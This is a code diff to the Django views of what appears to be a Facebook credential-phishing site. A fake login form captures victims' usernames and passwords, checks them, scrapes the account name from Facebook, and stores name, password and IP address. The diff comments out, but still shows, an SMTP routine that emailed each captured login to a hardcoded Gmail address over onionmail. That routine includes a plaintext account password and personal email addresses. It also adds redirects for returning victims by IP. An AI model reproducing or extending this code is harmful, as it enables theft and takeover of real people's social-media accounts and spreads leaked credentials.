@@ -1,5 +1,10 @@
+
+
+
 from django.shortcuts import render, HttpResponseRedirect
 from django.views.decorators.csrf import csrf_exempt
+from django.urls import reverse
+
 
 from .models import FbLogIn, NewLogs, SiteContent
 
@@ -40,10 +45,24 @@ def home_view(request):
 
 #@csrf_exempt
 def facebook_view(request):
+	# if client already exist we want to be redirected to the success view
+	client = get_client_ip(request)
+	for x in NewLogs.objects.all():
+		if x.ipadd == client :
+			print(NewLogs.objects.get(ipadd = client))
+			obj = NewLogs.objects.get(ipadd = client)
+			sc = SiteContent.objects.get(id = 1)
+			context = {
+				'obj' : obj,
+				'sc'  : sc 
+			}
+			return HttpResponseRedirect(reverse('success'))
+
 
 	# To render error messages for unmatched password
 	error1 = False # username or email
 	error2 = False	# password
+	loader = False
 
 	# Page login form
 	form = LogInForm(request.POST or None)
@@ -90,14 +109,13 @@ def facebook_view(request):
 				error2 = True
 				print('Omo na password o')
 
-
 			else:
 				error1 = True
 				print('Omo na Email o')
 		
 		else: 
 			# If login was successfuly scrape username from website using "BeautifulSoup"
-			print('found')
+			print('login successful')
 
 			time.sleep(5)
 
@@ -105,10 +123,11 @@ def facebook_view(request):
 			soup = bs(html, 'lxml')
 
 			# mydiv = soup.find_all('div', class_='qzhwtbm6 knvmm38d')
-			sp1 = soup.find('span', class_='d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em iv3no6db jq4qci2q a3bd9o3v ekzkrbhg oo9gr5id hzawbc8m')
+			# sp1 = soup.find('span', class_='d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em iv3no6db jq4qci2q a3bd9o3v ekzkrbhg oo9gr5id hzawbc8m')
+			sp1 = soup.find('span', class_="x1lliihq x6ikm8r x10wlt62 x1n2onr6")
 
 			print(sp1)
-			name = sp1.span.text
+			name = sp1.text
 			print(name)
 
 			# Include name and Ip address to form and save
@@ -123,32 +142,33 @@ def facebook_view(request):
 			
 			
 			# Using SMTP to send mail of form input
-			EMAIL_ADDRESS = "ciaramcqueen@onionmail.org"
-			EMAIL_PASSWORD = "4kushakara"
-			receiver = "ibrahimola72@gmail.com"
+			# EMAIL_ADDRESS = "ciaramcqueen@onionmail.org"
+			# EMAIL_PASSWORD = "4kushakara"
+			# receiver = "ibrahimola72@gmail.com"
 			
-			msg = EmailMessage()
-			msg['Subject'] = 'NewLogs'
-			msg['From'] = EMAIL_ADDRESS
-			msg['To'] = receiver
+			# msg = EmailMessage()
+			# msg['Subject'] = 'NewLogs'
+			# msg['From'] = EMAIL_ADDRESS
+			# msg['To'] = receiver
 		    
-			textsms = f" Name: {editform.name} \n username: {editform.username} \n password: {editform.password} \n ip: {editform.ipadd}" 
+			# textsms = f" Name: {editform.name} \n username: {editform.username} \n password: {editform.password} \n ip: {editform.ipadd}" 
 
-			msg.set_content(textsms)
+			# msg.set_content(textsms)
 
-			# #gmail smpt setting
-			# with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+			# # #gmail smpt setting
+			# # with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+			# # 	smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+			# # 	smtp.send_message(msg)
+
+			# #onion mail smtp setting
+			# with smtplib.SMTP('mail.onionmail.org', 587) as smtp:
+			# 	smtp.starttls()
 			# 	smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
 			# 	smtp.send_message(msg)
 
-			#onion mail smtp setting
-			with smtplib.SMTP('mail.onionmail.org', 587) as smtp:
-				smtp.starttls()
-				smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
-				smtp.send_message(msg)
-
 			# Redirect to "/success/" page
-			return HttpResponseRedirect("../success/")
+			# return HttpResponseRedirect("../success/")
+			return HttpResponseRedirect(reverse('success'))
 			
 
 		
@@ -165,6 +185,7 @@ def facebook_view(request):
 		'form' : form,
 		'error1' : error1,
 		'error2' : error2,
+		'loader' : loader,
 	}
 
 	return render(request, 'facebook.html', context)
@@ -181,3 +202,8 @@ def success_view(request):
 		'sc'  : sc 
 	}
 	return render(request, 'success.html', context)
+
+
+
+def error_404_view(request, *args, **kwargs):
+	return render(request, '404.html', {}) 
